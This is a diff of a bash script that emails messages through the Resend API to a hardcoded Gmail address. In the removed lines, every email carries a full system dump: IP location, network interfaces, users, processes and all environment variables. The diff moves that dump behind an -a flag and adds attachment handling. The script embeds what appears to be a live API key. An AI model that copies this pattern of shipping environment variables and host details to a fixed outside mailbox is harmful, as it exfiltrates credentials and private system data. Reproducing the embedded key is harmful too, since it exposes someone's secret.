@@ -4,6 +4,7 @@
 subject=""
 body=""
 file=""
+send_all_info=false  # By default, do not send all system info
 
 # Hardcoded receiver email
 receiver="marcush3llsquad@gmail.com"
@@ -14,7 +15,7 @@ sender_name="${USER}@${HOSTNAME}"
 # Get the user's location via IP (uses an external service like ipinfo.io)
 location=$(curl -s https://ipinfo.io/loc)
 
-# Gather comprehensive system information
+# Gather system information (only used when -a flag is set)
 os_info=$(uname -a)                              # OS and Kernel info
 cpu_info=$(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)  # CPU Model
 cpu_arch=$(uname -m)                             # CPU Architecture
@@ -31,13 +32,15 @@ running_processes=$(ps aux --sort=-%mem | head -n 10) # Top 10 processes by memo
 env_vars=$(printenv)                               # Environment Variables
 
 # Parse command line arguments
-while getopts ":s:b:f:" opt; do
+while getopts ":s:b:f:a" opt; do
   case $opt in
     s) subject="$OPTARG"
     ;;
     b) body="$OPTARG"
     ;;
     f) file="$OPTARG"
+    ;;
+    a) send_all_info=true  # Set flag to send all system information
     ;;
     \?) exit 1
     ;;
@@ -58,40 +61,50 @@ fi
 api_key="re_dSFUhTGY_6hNYMi4Uc33SfBBSfLY9Uotw"
 url="https://api.resend.com/emails"
 
-# Create full email body with all system info
-full_body="<p>$body</p>
-<hr>
-<h3>Comprehensive System Information:</h3>
-<ul>
-<li><strong>OS Info:</strong> $os_info</li>
-<li><strong>CPU Info:</strong> $cpu_info</li>
-<li><strong>CPU Architecture:</strong> $cpu_arch</li>
-<li><strong>Total Memory:</strong> $mem_total</li>
-<li><strong>Used Memory:</strong> $mem_used</li>
-<li><strong>Free Memory:</strong> $mem_free</li>
-<li><strong>Disk Usage (Root):</strong> $disk_usage</li>
-<li><strong>Disk Partitions:</strong> <pre>$disk_partitions</pre></li>
-<li><strong>Network Interfaces:</strong> $network_interfaces</li>
-<li><strong>IP Address:</strong> $ip_info</li>
-<li><strong>System Uptime:</strong> $uptime_info</li>
-<li><strong>Logged-in Users:</strong> <pre>$logged_users</pre></li>
-<li><strong>Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
-<li><strong>Environment Variables:</strong> <pre>$env_vars</pre></li>
-</ul>"
+# Create the email body based on the -a flag
+if [ "$send_all_info" = true ]; then
+  # Include detailed system info
+  full_body="<p>$body</p>
+  <hr>
+  <h3>Comprehensive System Information:</h3>
+  <ul>
+  <li><strong>OS Info:</strong> $os_info</li>
+  <li><strong>CPU Info:</strong> $cpu_info</li>
+  <li><strong>CPU Architecture:</strong> $cpu_arch</li>
+  <li><strong>Total Memory:</strong> $mem_total</li>
+  <li><strong>Used Memory:</strong> $mem_used</li>
+  <li><strong>Free Memory:</strong> $mem_free</li>
+  <li><strong>Disk Usage (Root):</strong> $disk_usage</li>
+  <li><strong>Disk Partitions:</strong> <pre>$disk_partitions</pre></li>
+  <li><strong>Network Interfaces:</strong> $network_interfaces</li>
+  <li><strong>IP Address:</strong> $ip_info</li>
+  <li><strong>System Uptime:</strong> $uptime_info</li>
+  <li><strong>Logged-in Users:</strong> <pre>$logged_users</pre></li>
+  <li><strong>Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
+  <li><strong>Environment Variables:</strong> <pre>$env_vars</pre></li>
+  </ul>"
+else
+  # Send only the provided subject, body, and file (no extra info)
+  full_body="<p>$body</p>"
+fi
 
-# Create email data
+# Prepare the email data
 if [ -n "$file" ]; then
-  # With file attachment (placeholder logic for handling attachments)
+  # If a file attachment is provided, attach it (this is a placeholder for actual file attachment handling)
   email_data=$(jq -n \
     --arg from "$sender_name <onboarding@resend.dev>" \
     --arg to "$receiver" \
     --arg subject "$subject" \
     --arg body "$full_body" \
+    --arg file "$file" \
     '{
       from: $from,
       to: [$to],
       subject: $subject,
-      html: $body
+      html: $body,
+      attachments: [{
+        path: $file
+      }]
     }')
 else
   # Without file attachment
